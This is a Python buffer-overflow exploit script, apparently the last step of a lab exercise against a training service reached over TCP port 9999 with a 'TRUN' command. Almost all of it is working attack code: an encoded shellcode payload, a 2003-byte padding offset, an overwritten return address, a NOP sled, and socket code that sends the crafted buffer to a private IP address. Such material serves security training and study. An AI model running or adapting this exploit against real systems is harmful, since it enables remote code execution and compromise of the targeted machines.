#!/usr/bin/python
# Step 3 after findOffset.py script. 
# To get 2003 use /usr/share/metasploit-framework/tools/exploits/pattern_offset.rb -l 3000 -q 386F4337 (whats in the EIP)

import sys, socket
from time import sleep


overflow = ("\xbe\x65\x90\xd3\x9c\xd9\xe8\xd9\x74\x24\xf4\x5f\x33\xc9\xb1"
"\x52\x31\x77\x12\x03\x77\x12\x83\xa2\x94\x31\x69\xd0\x7d\x37"
"\x92\x28\x7e\x58\x1a\xcd\x4f\x58\x78\x86\xe0\x68\x0a\xca\x0c"
"\x02\x5e\xfe\x87\x66\x77\xf1\x20\xcc\xa1\x3c\xb0\x7d\x91\x5f"
"\x32\x7c\xc6\xbf\x0b\x4f\x1b\xbe\x4c\xb2\xd6\x92\x05\xb8\x45"
"\x02\x21\xf4\x55\xa9\x79\x18\xde\x4e\xc9\x1b\xcf\xc1\x41\x42"
"\xcf\xe0\x86\xfe\x46\xfa\xcb\x3b\x10\x71\x3f\xb7\xa3\x53\x71"
"\x38\x0f\x9a\xbd\xcb\x51\xdb\x7a\x34\x24\x15\x79\xc9\x3f\xe2"
"\x03\x15\xb5\xf0\xa4\xde\x6d\xdc\x55\x32\xeb\x97\x5a\xff\x7f"
"\xff\x7e\xfe\xac\x74\x7a\x8b\x52\x5a\x0a\xcf\x70\x7e\x56\x8b"
"\x19\x27\x32\x7a\x25\x37\x9d\x23\x83\x3c\x30\x37\xbe\x1f\x5d"
"\xf4\xf3\x9f\x9d\x92\x84\xec\xaf\x3d\x3f\x7a\x9c\xb6\x99\x7d"
"\xe3\xec\x5e\x11\x1a\x0f\x9f\x38\xd9\x5b\xcf\x52\xc8\xe3\x84"
"\xa2\xf5\x31\x0a\xf2\x59\xea\xeb\xa2\x19\x5a\x84\xa8\x95\x85"
"\xb4\xd3\x7f\xae\x5f\x2e\xe8\x11\x37\xf8\x4a\xf9\x4a\xf8\x9b"
"\xa6\xc3\x1e\xf1\x46\x82\x89\x6e\xfe\x8f\x41\x0e\xff\x05\x2c"
"\x10\x8b\xa9\xd1\xdf\x7c\xc7\xc1\x88\x8c\x92\xbb\x1f\x92\x08"
"\xd3\xfc\x01\xd7\x23\x8a\x39\x40\x74\xdb\x8c\x99\x10\xf1\xb7"
"\x33\x06\x08\x21\x7b\x82\xd7\x92\x82\x0b\x95\xaf\xa0\x1b\x63"
"\x2f\xed\x4f\x3b\x66\xbb\x39\xfd\xd0\x0d\x93\x57\x8e\xc7\x73"
"\x21\xfc\xd7\x05\x2e\x29\xae\xe9\x9f\x84\xf7\x16\x2f\x41\xf0"
"\x6f\x4d\xf1\xff\xba\xd5\x11\xe2\x6e\x20\xba\xbb\xfb\x89\xa7"
"\x3b\xd6\xce\xd1\xbf\xd2\xae\x25\xdf\x97\xab\x62\x67\x44\xc6"
"\xfb\x02\x6a\x75\xfb\x06")

# 62 50 11 af
buffer = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32  + overflow

try:
  s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect(('192.168.200.169', 9999))
  s.send(('TRUN /.:/' + buffer))
  s.close()
except:
  print("Fuzzing crashed at %s bytes" % str(len(buffer)))
  sys.exit()


